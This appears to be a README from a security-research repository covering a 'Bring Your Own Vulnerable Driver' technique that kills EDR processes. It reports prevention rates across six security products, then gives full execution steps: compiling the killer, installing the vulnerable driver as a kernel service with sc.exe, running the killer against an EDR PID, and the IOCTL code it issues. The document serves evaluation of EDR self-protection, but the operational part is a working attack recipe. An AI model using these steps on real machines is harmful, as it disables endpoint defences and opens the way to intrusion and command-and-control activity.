# T8: EDR Process Termination

**DET classification:** Data Collection → EDR Agent Disruption

This technique demonstrates the use of a **Bring Your Own Vulnerable Driver (BYOVD)** approach to achieve kernel-level privileges, bypassing EDR user-mode and kernel-mode protections to directly terminate EDR processes or services.

The PoC leverages a known vulnerability in a legitimate driver to load a custom, malicious kernel driver (`kEvP64.bin`). Once loaded, the user-mode application (`PowerTool_killer.exe`) communicates with this driver to execute privileged operations against protected EDR processes. This results in the **complete and immediate neutralization of the EDR agent**.

## 📊 Evaluation Results

> Aggregated over **36 test-case outcomes**: 3 payload families (Cobalt Strike, Havoc, AdaptixC2) × 6 products × 2 Windows environments (Windows 11 Enterprise, Windows Server 2025), each scored on the five-tiered prevention-stage model (L1–L5).

**Overall effectiveness.** The technique reached **L5 (Operational Success) in 16.7%** of its 36 outcomes.

**Bypass Depth Distribution (BDD).**

| L1 Pre-execution | L2 Pre-C2 | L3 Pre-command | L4 Command-stage | L5 Operational Success |
| :---: | :---: | :---: | :---: | :---: |
| 66.7% | 16.7% | 0.0% | 0.0% | **16.7%** |

**Payload sensitivity (L5 rate).**

| Cobalt Strike | Havoc | AdaptixC2 |
| :---: | :---: | :---: |
| 16.7% | 16.7% | 16.7% |

**Per-product L5 rate** (n=6 per product; Defender AV = Microsoft Defender Antivirus).

| Sophos | Kaspersky | Bitdefender | Elastic Security | Huorong | Defender AV |
| :---: | :---: | :---: | :---: | :---: | :---: |
| 0.0% | 0.0% | 0.0% | 0.0% | 0.0% | 100.0% |

**Interpretation.** Direct termination of EDR processes was largely prevented early: 66.7% of all outcomes were stopped at L1 (pre-execution), typically through detection of the vulnerable-driver loading or the killer tool itself. All L5 outcomes concentrated on a single product — Microsoft Defender Antivirus, where every one of the 6 outcomes reached operational success. All other products (Sophos, Bitdefender, Elastic Security, Huorong at L1; Kaspersky at L2) prevented the technique before a C2 connection. The L5 rate is identical across all three payload families, consistent with a mechanism gated by privileges and self-protection rather than payload artifacts. This technique requires elevated privileges and a vulnerable signed driver, so its outcomes characterize **post-compromise EDR self-protection**.

## ⚙️ Usage (Defensive Research)

The implementation requires a killer executable and a vulnerable kernel driver binary (both included in this folder as auxiliary files without payload characteristics), plus administrative privileges to install and start the driver service.

### Prerequisites

  * **MinGW-w64** or equivalent environment for cross-compilation (if compiling the killer application).
  * The driver binary (`kEvP64.bin`) is required, and the killer must be **built from the source in this folder** (`PowerTool_killer.exe` is a build output, not distributed — see [BUILD.md](../BUILD.md)).
  * **Elevated administrator privileges** and a vulnerable signed driver are mandatory (see the paper's Table 7 for the required-privilege checklist).

### Detailed Execution Steps

1.  **Compile the User-Mode Killer Application (PowerTool\_killer.exe):**

      * Navigate to the source directory.
      * Use the following command to compile the killer application:
        ```bash
        x86_64-w64-mingw32-gcc -o PowerTool_killer.exe PowerTool_killer.c
        ```

2.  **Copy the Driver Binary:**

      * Copy the vulnerable kernel driver binary (`kEvP64.bin`) to a stable system location, typically the temporary directory, to ensure the service can locate it.
        ```bash
        copy /Y kEvP64.bin C:\Windows\Temp\kEvP64.bin
        ```

3.  **Install and Start the Kernel Service:**

      * Use `sc.exe` with Administrator privileges to create a new kernel-type service pointing to the copied driver and then start the service.
        ```bash
        sc.exe create kEvP64.sys binPath= C:\Windows\Temp\kEvP64.bin type= kernel
        sc.exe start kEvP64.sys
        ```
      * *Note: Successful execution of these steps confirms the BYOVD chain has been successfully exploited and the driver is running with kernel privileges.*

4.  **Execute the Killer Application:**

      * Run the compiled executable. The application will typically prompt for the Process ID (PID) of the EDR agent you wish to terminate.
        ```bash
        PowerTool_killer.exe
        ```

5.  **Cleanup (Mandatory for subsequent runs):**

      * Before taking a VM snapshot or running another test, ensure the service is stopped and deleted:
        ```bash
        sc.exe stop kEvP64.sys
        sc.exe delete kEvP64.sys
        ```

> **Warning:** This technique involves loading a vulnerable kernel driver that has full system access. Execute this PoC **only** in isolated VM environments with frequent, verifiable snapshots. **Do not execute this on non-testing systems.**

---

## 📦 Repository Contents

| Item | Status |
| :--- | :--- |
| Killer source | `PowerTool_killer.c` |
| Vulnerable driver | `kEvP64.bin` — **binary only, source not included** |
| Prebuilt executable | Not distributed — `PowerTool_killer.exe` is a **build output** ([BUILD.md](../BUILD.md)) |

`PowerTool_killer.c` compiles cleanly with MinGW-w64 gcc 14.2.0:

```bash
x86_64-w64-mingw32-gcc -o PowerTool_killer.exe PowerTool_killer.c
```

The driver's size, SHA-256 and observed provenance are recorded in
[../BINARY_PROVENANCE.md](../BINARY_PROVENANCE.md).

## ⚠️ Auditability Caveat

`kEvP64.bin` ships as an opaque third-party kernel driver with no source and
no build project. Its provenance, version and signing status are unrecorded
in this repository.

Wiring, so that the pieces can be matched to a driver build:

| Item | Value |
| :--- | :--- |
| Device opened by the killer | `\\.\KevP64` |
| Service name used in the `sc.exe` commands | `kEvP64.sys` |
| Driver copy path used below | `C:\Windows\Temp\kEvP64.bin` |
| IOCTL issued | `0x222034` (`IOCTL_KILL_PROCESS`, argument = PID) |

Windows service and device names are case-insensitive, so `KevP64` /
`kEvP64` refer to the same object; the casing is kept as it appears in each
file.

## 🧪 Validation Criteria (paper, Table 7)

- **Required privilege:** Elevated Administrator **plus a vulnerable signed
  driver** (BYOVD).
- **Evasion-logic criterion:** the targeted EDR protected process is
  terminated via kernel-level handle acquisition, and is no longer present in
  the task list.
- **Payload-functionality check:** C2 beacon observed within 60 seconds, and
  the beacon answers test commands.

## 🧹 Cleanup / Recovery

```bat
sc.exe stop kEvP64.sys
sc.exe delete kEvP64.sys
del C:\Windows\Temp\kEvP64.bin
```

Then confirm the service is gone (`sc.exe query kEvP64.sys`) and revert the
snapshot. Leaving the service installed leaves a kernel-mode component
running between tests.

## ⚠️ Known Limitations

- The killer takes the target PID interactively (`scanf`), so it is not
  scriptable as shipped.
- Requires a driver build whose IOCTL protocol matches `0x222034`.
